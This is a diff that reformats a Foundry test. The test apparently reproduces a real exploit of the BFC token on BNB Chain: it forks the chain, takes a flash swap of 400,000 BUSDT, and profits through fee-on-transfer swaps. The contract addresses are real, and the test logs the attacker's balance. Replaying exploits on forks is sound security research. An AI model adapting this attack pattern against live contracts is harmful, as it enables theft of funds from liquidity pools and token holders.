@@ -14,18 +14,15 @@ import "./interface.sol";
 // https://twitter.com/CertiKAlert/status/1700621314246017133
 
 contract BFCTest is Test {
-    Uni_Pair_V2 BUSDT_WBNB =
-        Uni_Pair_V2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
-    Uni_Pair_V2 BUSDT_BFC =
-        Uni_Pair_V2(0x71e1949A1180C0F945fe47C96f88b1a898760c05);
-    Uni_Router_V2 Router =
-        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    Uni_Pair_V2 BUSDT_WBNB = Uni_Pair_V2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
+    Uni_Pair_V2 BUSDT_BFC = Uni_Pair_V2(0x71e1949A1180C0F945fe47C96f88b1a898760c05);
+    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
     IERC20 BFC = IERC20(0x595eac4A0CE9b7175a99094680fbe55A774B5464);
     IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
 
     function setUp() public {
-        vm.createSelectFork("bsc", 31599443);
+        vm.createSelectFork("bsc", 31_599_443);
         vm.label(address(BUSDT_WBNB), "BUSDT_WBNB");
         vm.label(address(BUSDT_BFC), "BUSDT_BFC");
         vm.label(address(Router), "Router");
@@ -37,27 +34,14 @@ contract BFCTest is Test {
     function testExploit() public {
         deal(address(BUSDT), address(this), 0);
         deal(address(this), 0);
-        bytes memory swapData = abi.encode(
-            address(BFC),
-            address(BUSDT_BFC),
-            400_000 * 1e18
-        );
+        bytes memory swapData = abi.encode(address(BFC), address(BUSDT_BFC), 400_000 * 1e18);
         BUSDT_WBNB.swap(400_000 * 1e18, 0, address(this), swapData);
         swapBUSDTToBNB();
 
-        emit log_named_decimal_uint(
-            "Attacker BNB balance after attack",
-            address(this).balance,
-            18
-        );
+        emit log_named_decimal_uint("Attacker BNB balance after attack", address(this).balance, 18);
     }
 
-    function pancakeCall(
-        address _sender,
-        uint256 _amount0,
-        uint256 _amount1,
-        bytes calldata _data
-    ) external {
+    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
         BFC.approve(address(Router), type(uint256).max);
         BUSDT.approve(address(Router), type(uint256).max);
 
@@ -98,11 +82,7 @@ contract BFCTest is Test {
         path[1] = address(BFC);
 
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            amountIn,
-            0,
-            path,
-            address(this),
-            block.timestamp + 1000
+            amountIn, 0, path, address(this), block.timestamp + 1000
         );
     }
 
@@ -112,11 +92,7 @@ contract BFCTest is Test {
         path[1] = address(BUSDT);
 
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            BFC.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp + 1000
+            BFC.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
         );
     }
 
@@ -125,12 +101,6 @@ contract BFCTest is Test {
         path[0] = address(BUSDT);
         path[1] = address(WBNB);
 
-        Router.swapExactTokensForETH(
-            BUSDT.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp + 1000
-        );
+        Router.swapExactTokensForETH(BUSDT.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000);
     }
 }
